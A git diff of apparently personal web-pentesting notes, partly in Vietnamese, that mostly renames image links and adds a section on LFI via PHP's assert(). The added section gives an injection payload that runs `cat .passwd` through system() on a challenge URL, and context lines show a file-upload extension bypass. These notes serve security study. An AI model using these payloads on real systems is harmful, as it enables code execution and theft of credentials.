@@ -178,7 +178,7 @@ create: `file.php%0a.png`
 
 ![](<../.gitbook/assets/image (2) (1).png>)
 
-![](<../.gitbook/assets/image (6).png>)
+![](<../.gitbook/assets/image (6) (2).png>)
 
 ### 20.Install files
 
@@ -284,7 +284,7 @@ The problem that we have to bypass blacklist because with each access\_token it 
 
 * with **rfc3548 we can** see that the character out of alphabet will be **** skipped
 
-![](<../.gitbook/assets/image (1).png>)
+![](<../.gitbook/assets/image (1) (3).png>)
 
 ![](<../.gitbook/assets/image (29).png>)
 
@@ -298,7 +298,7 @@ The problem that we have to bypass blacklist because with each access\_token it 
 
 ![](<../.gitbook/assets/image (9).png>)
 
-![](../.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (1).png>)
 
 ### 22. CRLF
 
@@ -327,3 +327,26 @@ gửi payload trên url và urlencode để server decode lại&#x20;
 <figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### 24.PHP - assert()
+
+``[`doc`](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)``
+
+[doc`2`](https://hoccyber.com/khai-thac-lfi/)``
+
+**Detect** lỗi **File Inclusion -> LFI via PHP's 'assert**
+
+Khả nghi:
+
+```
+GET /web-serveur/ch47/?page= ...
+```
+
+command:
+
+```
+' and die(system("cat .passwd")) or '
+```
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
